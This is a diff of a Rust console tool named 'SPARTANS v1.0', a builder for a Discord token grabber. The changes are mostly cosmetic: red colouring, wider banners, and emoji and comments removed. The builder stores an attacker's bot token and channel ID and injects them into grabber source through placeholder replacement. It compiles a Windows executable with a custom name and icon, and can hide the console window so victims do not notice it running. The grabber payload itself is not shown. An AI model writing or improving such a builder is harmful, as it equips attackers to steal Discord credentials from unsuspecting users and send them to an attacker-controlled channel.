@@ -19,27 +19,32 @@ impl CompileSettings {
     }
 
     fn show_status(&self) {
-        println!("\n  Current settings:");
-        println!("  Window Mode: {}", self.window_mode.to_uppercase());
-        println!("  Output Name: {}.exe", self.output_name);
+        println!("\n{}", center_text("Current settings:"));
+        println!("{}", center_text(&format!("Window Mode: {}", self.window_mode.to_uppercase())));
+        println!("{}", center_text(&format!("Output Name: {}.exe", self.output_name)));
         if let Some(icon) = &self.icon_path {
-            println!("  Icon: {}", icon);
+            println!("{}", center_text(&format!("Icon: {}", icon)));
         } else {
-            println!("  Icon: None");
+            println!("{}", center_text("Icon: None"));
         }
     }
 }
 
 fn clear_screen() {
-    // Use Windows cls command instead of ANSI escape codes
     Command::new("cmd")
         .args(&["/c", "cls"])
         .status()
         .ok();
 }
 
+fn set_red_color() {
+    // Dark red color (ANSI code)
+    print!("\x1b[38;5;124m");
+    io::stdout().flush().ok();
+}
+
 fn center_text(text: &str) -> String {
-    let width = 80; // Standard console width
+    let width = 80;
     let text_len = text.len();
     if text_len >= width {
         return text.to_string();
@@ -50,16 +55,17 @@ fn center_text(text: &str) -> String {
 
 fn show_main_menu() {
     clear_screen();
+    set_red_color();
     
+    println!("\n\n\n");
+    println!("{}", center_text("╔═══════════════════════════════════════════════╗"));
+    println!("{}", center_text("║              SPARTANS v1.0                    ║"));
+    println!("{}", center_text("╚═══════════════════════════════════════════════╝"));
     println!("\n\n");
-    println!("{}", center_text("╔═══════════════════════════════════════╗"));
-    println!("{}", center_text("║         SPARTANS v1.0                 ║"));
-    println!("{}", center_text("╚═══════════════════════════════════════╝"));
-    println!("\n");
     println!("{}", center_text("[1] Configure Discord Bot"));
     println!("{}", center_text("[2] Compile Archive"));
     println!("{}", center_text("[0] Exit"));
-    println!("\n");
+    println!("\n\n");
     print!("{}", center_text("Select option: "));
     io::stdout().flush().unwrap();
 }
@@ -86,42 +92,40 @@ fn main() {
 fn config_bot_menu() {
     loop {
         clear_screen();
+        set_red_color();
         
-        println!("\n\n");
-        println!("{}", center_text("╔═══════════════════════════════════════╗"));
-        println!("{}", center_text("║    DISCORD BOT CONFIGURATION          ║"));
-        println!("{}", center_text("╚═══════════════════════════════════════╝"));
+        println!("\n\n\n");
+        println!("{}", center_text("╔═══════════════════════════════════════════════╗"));
+        println!("{}", center_text("║         DISCORD BOT CONFIGURATION             ║"));
+        println!("{}", center_text("╚═══════════════════════════════════════════════╝"));
         println!("\n");
         
-        // Always show current config at the top
-        println!("{}", center_text("─────────────────────────────────────"));
+        // Show current config
+        println!("{}", center_text("─────────────────────────────────────────────"));
         if let Ok(cfg) = fs::read_to_string("config.txt") {
             let lines: Vec<&str> = cfg.lines().collect();
             if lines.len() >= 2 {
-                // Show token preview (first 40 chars + ...)
                 let token_preview = if lines[0].len() > 40 {
                     format!("{}...", &lines[0][..40])
                 } else {
                     lines[0].to_string()
                 };
-                println!("{}", center_text(&format!("📝 Bot Token: {}", token_preview)));
-                println!("{}", center_text(&format!("📢 Channel ID: {}", lines[1])));
+                println!("{}", center_text(&format!("Bot Token: {}", token_preview)));
+                println!("{}", center_text(&format!("Channel ID: {}", lines[1])));
             } else {
-                println!("{}", center_text("❌ No configuration found"));
-                println!("{}", center_text("Please use option [2] to paste config"));
+                println!("{}", center_text("No configuration found"));
             }
         } else {
-            println!("{}", center_text("❌ No configuration found"));
-            println!("{}", center_text("Please use option [2] to paste config"));
+            println!("{}", center_text("No configuration found"));
         }
-        println!("{}", center_text("─────────────────────────────────────"));
-        println!("\n");
+        println!("{}", center_text("─────────────────────────────────────────────"));
+        println!("\n\n");
         
         println!("{}", center_text("[1] Copy Bot Token / Channel ID"));
         println!("{}", center_text("[2] Paste Bot Token / Channel ID"));
         println!("{}", center_text("[3] Delete Bot Token / Channel ID"));
         println!("{}", center_text("[0] Back to Main Menu"));
-        println!("\n");
+        println!("\n\n");
         print!("{}", center_text("Select option: "));
         io::stdout().flush().unwrap();
         
@@ -140,23 +144,24 @@ fn config_bot_menu() {
 
 fn copy_bot_config() {
     clear_screen();
+    set_red_color();
+    
+    println!("\n\n\n");
+    println!("{}", center_text("╔═══════════════════════════════════════════════╗"));
+    println!("{}", center_text("║           COPY BOT CONFIGURATION              ║"));
+    println!("{}", center_text("╚═══════════════════════════════════════════════╝"));
     println!("\n\n");
-    println!("{}", center_text("╔═══════════════════════════════════════╗"));
-    println!("{}", center_text("║      COPY BOT CONFIGURATION           ║"));
-    println!("{}", center_text("╚═══════════════════════════════════════╝"));
-    println!("\n");
     
     if !Path::new("config.txt").exists() {
-        println!("{}", center_text("❌ No configuration found"));
+        println!("{}", center_text("No configuration found"));
         println!("{}", center_text("Please paste a configuration first (option 2)"));
-        println!("\n");
+        println!("\n\n");
         pause();
         return;
     }
     
     match fs::read_to_string("config.txt") {
         Ok(content) => {
-            // Copy to clipboard using PowerShell
             let ps_cmd = format!(
                 "Set-Clipboard -Value '{}'",
                 content.replace("'", "''")
@@ -168,66 +173,68 @@ fn copy_bot_config() {
             
             match result {
                 Ok(status) if status.success() => {
-                    println!("{}", center_text("✅ Configuration copied to clipboard!"));
-                    println!("\n");
+                    println!("{}", center_text("Configuration copied to clipboard!"));
+                    println!("\n\n");
                     println!("{}", center_text("You can now paste it anywhere:"));
                     println!("{}", center_text("• Notepad"));
                     println!("{}", center_text("• Discord DM"));
                     println!("{}", center_text("• Another computer"));
                 }
                 _ => {
-                    println!("{}", center_text("❌ Failed to copy to clipboard"));
-                    println!("\n");
+                    println!("{}", center_text("Failed to copy to clipboard"));
+                    println!("\n\n");
                     println!("{}", center_text("Manual copy:"));
-                    println!("{}", center_text("─────────────────────────────────────"));
+                    println!("{}", center_text("─────────────────────────────────────────────"));
                     for line in content.lines() {
                         println!("{}", center_text(line));
                     }
-                    println!("{}", center_text("─────────────────────────────────────"));
+                    println!("{}", center_text("─────────────────────────────────────────────"));
                 }
             }
         }
         Err(_) => {
-            println!("{}", center_text("❌ Failed to read configuration"));
+            println!("{}", center_text("Failed to read configuration"));
         }
     }
     
-    println!("\n");
+    println!("\n\n");
     pause();
 }
 
 fn paste_bot_config() {
     clear_screen();
+    set_red_color();
+    
+    println!("\n\n\n");
+    println!("{}", center_text("╔═══════════════════════════════════════════════╗"));
+    println!("{}", center_text("║          PASTE BOT CONFIGURATION              ║"));
+    println!("{}", center_text("╚═══════════════════════════════════════════════╝"));
     println!("\n\n");
-    println!("{}", center_text("╔═══════════════════════════════════════╗"));
-    println!("{}", center_text("║     PASTE BOT CONFIGURATION           ║"));
-    println!("{}", center_text("╚═══════════════════════════════════════╝"));
-    println!("\n");
     
     println!("{}", center_text("Paste your Bot Token and Channel ID"));
     println!("{}", center_text("Format: Token on line 1, Channel ID on line 2"));
-    println!("\n");
+    println!("\n\n");
     
-    print!("  Bot Token: ");
+    print!("{}  Bot Token: ", " ".repeat(25));
     io::stdout().flush().unwrap();
     let mut token = String::new();
     io::stdin().read_line(&mut token).unwrap();
     
     if token.trim().is_empty() {
-        println!("\n{}", center_text("❌ Cancelled"));
-        println!("\n");
+        println!("\n{}", center_text("Cancelled"));
+        println!("\n\n");
         pause();
         return;
     }
     
-    print!("  Channel ID: ");
+    print!("{}  Channel ID: ", " ".repeat(25));
     io::stdout().flush().unwrap();
     let mut channel = String::new();
     io::stdin().read_line(&mut channel).unwrap();
     
     if channel.trim().is_empty() {
-        println!("\n{}", center_text("❌ Cancelled"));
-        println!("\n");
+        println!("\n{}", center_text("Cancelled"));
+        println!("\n\n");
         pause();
         return;
     }
@@ -235,41 +242,43 @@ fn paste_bot_config() {
     let cfg = format!("{}\n{}", token.trim(), channel.trim());
     match fs::write("config.txt", cfg) {
         Ok(_) => {
-            println!("\n{}", center_text("✅ Configuration saved successfully!"));
-            println!("\n");
+            println!("\n{}", center_text("Configuration saved successfully!"));
+            println!("\n\n");
             println!("{}", center_text(&format!("Token: {}...", &token.trim()[..30.min(token.trim().len())])));
             println!("{}", center_text(&format!("Channel: {}", channel.trim())));
         }
         Err(_) => {
-            println!("\n{}", center_text("❌ Failed to save configuration"));
+            println!("\n{}", center_text("Failed to save configuration"));
         }
     }
     
-    println!("\n");
+    println!("\n\n");
     pause();
 }
 
 fn delete_bot_config() {
     clear_screen();
+    set_red_color();
+    
+    println!("\n\n\n");
+    println!("{}", center_text("╔═══════════════════════════════════════════════╗"));
+    println!("{}", center_text("║         DELETE BOT CONFIGURATION              ║"));
+    println!("{}", center_text("╚═══════════════════════════════════════════════╝"));
     println!("\n\n");
-    println!("{}", center_text("╔═══════════════════════════════════════╗"));
-    println!("{}", center_text("║    DELETE BOT CONFIGURATION           ║"));
-    println!("{}", center_text("╚═══════════════════════════════════════╝"));
-    println!("\n");
     
     if !Path::new("config.txt").exists() {
-        println!("{}", center_text("ℹ️ No configuration found"));
-        println!("\n");
+        println!("{}", center_text("No configuration found"));
+        println!("\n\n");
         pause();
         return;
     }
     
-    println!("{}", center_text("⚠️ Are you sure you want to delete?"));
+    println!("{}", center_text("Are you sure you want to delete?"));
     println!("{}", center_text("This action cannot be undone!"));
-    println!("\n");
+    println!("\n\n");
     println!("{}", center_text("[Y] Yes, delete it"));
     println!("{}", center_text("[N] No, go back"));
-    println!("\n");
+    println!("\n\n");
     print!("{}", center_text("Choice: "));
     io::stdout().flush().unwrap();
     
@@ -279,17 +288,17 @@ fn delete_bot_config() {
     if input.trim().eq_ignore_ascii_case("y") {
         match fs::remove_file("config.txt") {
             Ok(_) => {
-                println!("\n{}", center_text("✅ Configuration deleted"));
+                println!("\n{}", center_text("Configuration deleted"));
             }
             Err(_) => {
-                println!("\n{}", center_text("❌ Failed to delete"));
+                println!("\n{}", center_text("Failed to delete"));
             }
         }
     } else {
-        println!("\n{}", center_text("ℹ️ Cancelled"));
+        println!("\n{}", center_text("Cancelled"));
     }
     
-    println!("\n");
+    println!("\n\n");
     pause();
 }
 
@@ -297,16 +306,17 @@ fn delete_bot_config() {
 fn compile_menu(settings: &mut CompileSettings) {
     loop {
         clear_screen();
+        set_red_color();
         
+        println!("\n\n\n");
+        println!("{}", center_text("╔═══════════════════════════════════════════════╗"));
+        println!("{}", center_text("║              COMPILE ARCHIVE                  ║"));
+        println!("{}", center_text("╚═══════════════════════════════════════════════╝"));
         println!("\n\n");
-        println!("{}", center_text("╔═══════════════════════════════════════╗"));
-        println!("{}", center_text("║         COMPILE ARCHIVE               ║"));
-        println!("{}", center_text("╚═══════════════════════════════════════╝"));
-        println!("\n");
         println!("{}", center_text("[1] Compile Token Grabber"));
         println!("{}", center_text("[2] Compile Custom Archive"));
         println!("{}", center_text("[0] Back to Main Menu"));
-        println!("\n");
+        println!("\n\n");
         print!("{}", center_text("Select option: "));
         io::stdout().flush().unwrap();
         
@@ -325,22 +335,23 @@ fn compile_menu(settings: &mut CompileSettings) {
 fn compile_grabber_menu(settings: &mut CompileSettings) {
     loop {
         clear_screen();
+        set_red_color();
         
-        println!("\n\n");
-        println!("{}", center_text("╔═══════════════════════════════════════╗"));
-        println!("{}", center_text("║     COMPILE TOKEN GRABBER             ║"));
-        println!("{}", center_text("╚═══════════════════════════════════════╝"));
+        println!("\n\n\n");
+        println!("{}", center_text("╔═══════════════════════════════════════════════╗"));
+        println!("{}", center_text("║          COMPILE TOKEN GRABBER                ║"));
+        println!("{}", center_text("╚═══════════════════════════════════════════════╝"));
         
         settings.show_status();
         
-        println!("\n");
+        println!("\n\n");
         println!("{}", center_text("Configuration:"));
         println!("{}", center_text("[1] Window Mode (Show/Hide console)"));
         println!("{}", center_text("[2] Output Name"));
         println!("{}", center_text("[3] Icon File"));
         println!("{}", center_text("[4] Start Compilation"));
         println!("{}", center_text("[0] Back"));
-        println!("\n");
+        println!("\n\n");
         print!("{}", center_text("Select option: "));
         io::stdout().flush().unwrap();
         
@@ -363,17 +374,18 @@ fn compile_grabber_menu(settings: &mut CompileSettings) {
 
 fn configure_window_mode(settings: &mut CompileSettings) {
     clear_screen();
+    set_red_color();
     
+    println!("\n\n\n");
+    println!("{}", center_text("╔═══════════════════════════════════════════════╗"));
+    println!("{}", center_text("║               WINDOW MODE                     ║"));
+    println!("{}", center_text("╚═══════════════════════════════════════════════╝"));
     println!("\n\n");
-    println!("{}", center_text("╔═══════════════════════════════════════╗"));
-    println!("{}", center_text("║          WINDOW MODE                  ║"));
-    println!("{}", center_text("╚═══════════════════════════════════════╝"));
-    println!("\n");
     println!("{}", center_text("Choose window mode:"));
-    println!("\n");
+    println!("\n\n");
     println!("{}", center_text("[1] Visible (Show console window)"));
     println!("{}", center_text("[2] Hidden (Run silently)"));
-    println!("\n");
+    println!("\n\n");
     print!("{}", center_text("Select option: "));
     io::stdout().flush().unwrap();
     
@@ -383,32 +395,33 @@ fn configure_window_mode(settings: &mut CompileSettings) {
     match input.trim() {
         "1" => {
             settings.window_mode = String::from("visible");
-            println!("\n{}", center_text("✅ Set to: VISIBLE"));
+            println!("\n{}", center_text("Set to: VISIBLE"));
         }
         "2" => {
             settings.window_mode = String::from("hidden");
-            println!("\n{}", center_text("✅ Set to: HIDDEN"));
+            println!("\n{}", center_text("Set to: HIDDEN"));
         }
         _ => {
-            println!("\n{}", center_text("❌ Invalid option"));
+            println!("\n{}", center_text("Invalid option"));
         }
     }
     
-    println!("\n");
+    println!("\n\n");
     pause();
 }
 
 fn configure_output_name(settings: &mut CompileSettings) {
     clear_screen();
+    set_red_color();
     
+    println!("\n\n\n");
+    println!("{}", center_text("╔═══════════════════════════════════════════════╗"));
+    println!("{}", center_text("║               OUTPUT NAME                     ║"));
+    println!("{}", center_text("╚═══════════════════════════════════════════════╝"));
     println!("\n\n");
-    println!("{}", center_text("╔═══════════════════════════════════════╗"));
-    println!("{}", center_text("║          OUTPUT NAME                  ║"));
-    println!("{}", center_text("╚═══════════════════════════════════════╝"));
-    println!("\n");
     println!("{}", center_text(&format!("Current: {}.exe", settings.output_name)));
-    println!("\n");
-    print!("  New name (without .exe): ");
+    println!("\n\n");
+    print!("{}  New name (without .exe): ", " ".repeat(20));
     io::stdout().flush().unwrap();
     
     let mut name = String::new();
@@ -422,23 +435,24 @@ fn configure_output_name(settings: &mut CompileSettings) {
             name
         };
         settings.output_name = String::from(name);
-        println!("\n{}", center_text(&format!("✅ Output name set to: {}.exe", name)));
+        println!("\n{}", center_text(&format!("Output name set to: {}.exe", name)));
     } else {
-        println!("\n{}", center_text("ℹ️ Name not changed"));
+        println!("\n{}", center_text("Name not changed"));
     }
     
-    println!("\n");
+    println!("\n\n");
     pause();
 }
 
 fn configure_icon(settings: &mut CompileSettings) {
     clear_screen();
+    set_red_color();
     
+    println!("\n\n\n");
+    println!("{}", center_text("╔═══════════════════════════════════════════════╗"));
+    println!("{}", center_text("║                ICON FILE                      ║"));
+    println!("{}", center_text("╚═══════════════════════════════════════════════╝"));
     println!("\n\n");
-    println!("{}", center_text("╔═══════════════════════════════════════╗"));
-    println!("{}", center_text("║           ICON FILE                   ║"));
-    println!("{}", center_text("╚═══════════════════════════════════════╝"));
-    println!("\n");
     
     if let Some(icon) = &settings.icon_path {
         println!("{}", center_text(&format!("Current: {}", icon)));
@@ -446,10 +460,10 @@ fn configure_icon(settings: &mut CompileSettings) {
         println!("{}", center_text("No icon selected"));
     }
     
-    println!("\n");
+    println!("\n\n");
     println!("{}", center_text("Enter icon path (or leave empty for no icon):"));
-    println!("\n");
-    print!("  Path: ");
+    println!("\n\n");
+    print!("{}  Path: ", " ".repeat(30));
     io::stdout().flush().unwrap();
     
     let mut path = String::new();
@@ -458,62 +472,60 @@ fn configure_icon(settings: &mut CompileSettings) {
     
     if !path.is_empty() {
         if !Path::new(path).exists() {
-            println!("\n{}", center_text("❌ File not found"));
+            println!("\n{}", center_text("File not found"));
         } else if !path.to_lowercase().ends_with(".ico") {
-            println!("\n{}", center_text("❌ File must be .ico format"));
+            println!("\n{}", center_text("File must be .ico format"));
         } else {
             settings.icon_path = Some(String::from(path));
-            println!("\n{}", center_text("✅ Icon set"));
+            println!("\n{}", center_text("Icon set"));
         }
     } else {
         settings.icon_path = None;
-        println!("\n{}", center_text("ℹ️ Icon removed"));
+        println!("\n{}", center_text("Icon removed"));
     }
     
-    println!("\n");
+    println!("\n\n");
     pause();
 }
 
 fn compile_token_grabber(settings: &CompileSettings) {
     clear_screen();
+    set_red_color();
     
+    println!("\n\n\n");
+    println!("{}", center_text("╔═══════════════════════════════════════════════╗"));
+    println!("{}", center_text("║         COMPILING TOKEN GRABBER               ║"));
+    println!("{}", center_text("╚═══════════════════════════════════════════════╝"));
     println!("\n\n");
-    println!("{}", center_text("╔═══════════════════════════════════════╗"));
-    println!("{}", center_text("║    COMPILING TOKEN GRABBER            ║"));
-    println!("{}", center_text("╚═══════════════════════════════════════╝"));
-    println!("\n");
     
-    // Check if config exists
     if !Path::new("config.txt").exists() {
-        println!("{}", center_text("❌ Bot not configured"));
+        println!("{}", center_text("Bot not configured"));
         println!("{}", center_text("Configure it first (Option 1)"));
-        println!("\n");
+        println!("\n\n");
         pause();
         return;
     }
     
-    // Check if grabber source exists
     let grabber_src = Path::new("utilitys/token-grabber/main.rs");
     if !grabber_src.exists() {
-        println!("{}", center_text("❌ Grabber source not found"));
+        println!("{}", center_text("Grabber source not found"));
         println!("{}", center_text("Expected: utilitys/token-grabber/main.rs"));
-        println!("\n");
+        println!("\n\n");
         pause();
         return;
     }
     
     println!("{}", center_text("Configuration:"));
     settings.show_status();
-    println!("\n");
-    println!("{}", center_text("🔄 Starting compilation..."));
-    println!("\n");
+    println!("\n\n");
+    println!("{}", center_text("Starting compilation..."));
+    println!("\n\n");
     
-    // Read config
     let cfg = match fs::read_to_string("config.txt") {
         Ok(c) => c,
         Err(_) => {
-            println!("{}", center_text("❌ Cannot read config"));
-            println!("\n");
+            println!("{}", center_text("Cannot read config"));
+            println!("\n\n");
             pause();
             return;
         }
@@ -521,8 +533,8 @@ fn compile_token_grabber(settings: &CompileSettings) {
     
     let lines: Vec<&str> = cfg.lines().collect();
     if lines.len() < 2 {
-        println!("{}", center_text("❌ Invalid config"));
-        println!("\n");
+        println!("{}", center_text("Invalid config"));
+        println!("\n\n");
         pause();
         return;
     }
@@ -532,32 +544,27 @@ fn compile_token_grabber(settings: &CompileSettings) {
     
     println!("{}", center_text("[1/4] Reading grabber source..."));
     
-    // Read original grabber source
     let grabber_code = match fs::read_to_string(grabber_src) {
         Ok(code) => code,
         Err(_) => {
-            println!("{}", center_text("❌ Cannot read grabber source"));
-            println!("\n");
+            println!("{}", center_text("Cannot read grabber source"));
+            println!("\n\n");
             pause();
             return;
         }
     };
     
-    // Replace placeholders
     let modified_code = grabber_code
         .replace("YOUR_BOT_TOKEN_HERE", bot_token)
         .replace("YOUR_CHANNEL_ID_HERE", channel_id);
     
     println!("{}", center_text("[2/4] Creating temporary project..."));
     
-    // Create temporary project
     let _ = fs::remove_dir_all("grabber_tmp");
     fs::create_dir_all("grabber_tmp/src").ok();
     
-    // Write modified source
     fs::write("grabber_tmp/src/main.rs", modified_code).ok();
     
-    // Create Cargo.toml
     let cargo_toml = r#"[package]
 name = "discord-grabber"
 version = "1.0.0"
@@ -576,10 +583,9 @@ panic = "abort"
     fs::write("grabber_tmp/Cargo.toml", cargo_toml).ok();
     
     println!("{}", center_text("[3/4] Compiling... (30-90 seconds)"));
-    println!("{}", center_text("⏳ Please wait..."));
-    println!("\n");
+    println!("{}", center_text("Please wait..."));
+    println!("\n\n");
     
-    // Compile
     let mut cmd = Command::new("cargo");
     cmd.current_dir("grabber_tmp")
         .arg("build")
@@ -587,7 +593,6 @@ panic = "abort"
         .arg("--target")
         .arg("x86_64-pc-windows-gnu");
     
-    // Hidden window mode
     if settings.window_mode == "hidden" {
         fs::create_dir_all("grabber_tmp/.cargo").ok();
         let cargo_config = r#"[target.x86_64-pc-windows-gnu]
@@ -609,11 +614,11 @@ rustflags = ["-C", "link-args=-Wl,--subsystem,windows"]
                 let output_path = Path::new(&output_filename);
                 
                 if fs::copy(exe_path, &output_path).is_ok() {
-                    println!("\n");
-                    println!("{}", center_text("═══════════════════════════════════════"));
-                    println!("{}", center_text("          ✅ SUCCESS!"));
-                    println!("{}", center_text("═══════════════════════════════════════"));
-                    println!("\n");
+                    println!("\n\n");
+                    println!("{}", center_text("═══════════════════════════════════════════════"));
+                    println!("{}", center_text("                SUCCESS!"));
+                    println!("{}", center_text("═══════════════════════════════════════════════"));
+                    println!("\n\n");
                     println!("{}", center_text(&format!("File: {}.exe", settings.output_name)));
                     
                     if let Ok(metadata) = fs::metadata(&output_path) {
@@ -622,73 +627,63 @@ rustflags = ["-C", "link-args=-Wl,--subsystem,windows"]
                     }
                     
                     println!("{}", center_text("Location: SPARTANS folder"));
-                    println!("\n");
+                    println!("\n\n");
                     
                     if settings.window_mode == "hidden" {
-                        println!("{}", center_text("⚠️ Window mode: HIDDEN"));
+                        println!("{}", center_text("Window mode: HIDDEN"));
                         println!("{}", center_text("Console will NOT be visible when run"));
                     } else {
-                        println!("{}", center_text("ℹ️ Window mode: VISIBLE"));
+                        println!("{}", center_text("Window mode: VISIBLE"));
                         println!("{}", center_text("Console will be visible when run"));
                     }
                     
-                    println!("\n");
+                    println!("\n\n");
                     println!("{}", center_text("Bot configured:"));
                     println!("{}", center_text(&format!("Token: {}...", &bot_token[..30.min(bot_token.len())])));
                     println!("{}", center_text(&format!("Channel: {}", channel_id)));
                 } else {
-                    println!("\n{}", center_text("❌ Failed to copy to SPARTANS folder"));
+                    println!("\n{}", center_text("Failed to copy to SPARTANS folder"));
                 }
             } else {
-                println!("\n{}", center_text("❌ EXE not found after compilation"));
+                println!("\n{}", center_text("EXE not found after compilation"));
             }
         }
-        Ok(o) => {
-            println!("\n{}", center_text("❌ Compilation failed"));
-            println!("\n");
-            
-            let stderr = String::from_utf8_lossy(&o.stderr);
-            if !stderr.is_empty() {
-                println!("{}", center_text("Error details:"));
-                for line in stderr.lines().take(10) {
-                    println!("  {}", line);
-                }
-                println!();
-            }
-            
+        Ok(_) => {
+            println!("\n{}", center_text("Compilation failed"));
+            println!("\n\n");
             println!("{}", center_text("Make sure:"));
             println!("{}", center_text("1. Rust is installed: cargo --version"));
             println!("{}", center_text("2. Target: rustup target add x86_64-pc-windows-gnu"));
         }
         Err(e) => {
-            println!("\n{}", center_text(&format!("❌ Cannot run cargo: {}", e)));
+            println!("\n{}", center_text(&format!("Cannot run cargo: {}", e)));
             println!("{}", center_text("Make sure Rust is installed properly"));
         }
     }
     
-    // Cleanup
-    println!("\n");
-    println!("{}", center_text("🧹 Cleaning up..."));
+    println!("\n\n");
+    println!("{}", center_text("Cleaning up..."));
     let _ = fs::remove_dir_all("grabber_tmp");
-    println!("{}", center_text("✅ Cleanup complete"));
-    println!("\n");
+    println!("{}", center_text("Cleanup complete"));
+    println!("\n\n");
     
     pause();
 }
 
 fn compile_custom() {
     clear_screen();
+    set_red_color();
     
+    println!("\n\n\n");
+    println!("{}", center_text("╔═══════════════════════════════════════════════╗"));
+    println!("{}", center_text("║          COMPILE CUSTOM ARCHIVE               ║"));
+    println!("{}", center_text("╚═══════════════════════════════════════════════╝"));
     println!("\n\n");
-    println!("{}", center_text("╔═══════════════════════════════════════╗"));
-    println!("{}", center_text("║     COMPILE CUSTOM ARCHIVE            ║"));
-    println!("{}", center_text("╚═══════════════════════════════════════╝"));
-    println!("\n");
     println!("{}", center_text("This feature allows you to compile custom Rust projects."));
-    println!("\n");
+    println!("\n\n");
     println!("{}", center_text("Enter path to your main.rs file:"));
-    println!("\n");
-    print!("  Path: ");
+    println!("\n\n");
+    print!("{}  Path: ", " ".repeat(30));
     io::stdout().flush().unwrap();
     
     let mut path = String::new();
@@ -696,27 +691,27 @@ fn compile_custom() {
     let path = path.trim().trim_matches('"');
     
     if path.is_empty() {
-        println!("\n{}", center_text("ℹ️ Cancelled"));
-        println!("\n");
+        println!("\n{}", center_text("Cancelled"));
+        println!("\n\n");
         pause();
         return;
     }
     
     if !Path::new(path).exists() {
-        println!("\n{}", center_text(&format!("❌ File not found: {}", path)));
-        println!("\n");
+        println!("\n{}", center_text(&format!("File not found: {}", path)));
+        println!("\n\n");
         pause();
         return;
     }
     
-    println!("\n{}", center_text("ℹ️ Feature under development"));
+    println!("\n{}", center_text("Feature under development"));
     println!("{}", center_text("For now, use the Token Grabber compiler (Option 2-1)"));
-    println!("\n");
+    println!("\n\n");
     pause();
 }
 
 fn pause() {
-    print!("\n  Press Enter to continue...");
+    print!("\n{}  Press Enter to continue...", " ".repeat(20));
     io::stdout().flush().unwrap();
     let mut buffer = String::new();
     io::stdin().read_line(&mut buffer).ok();
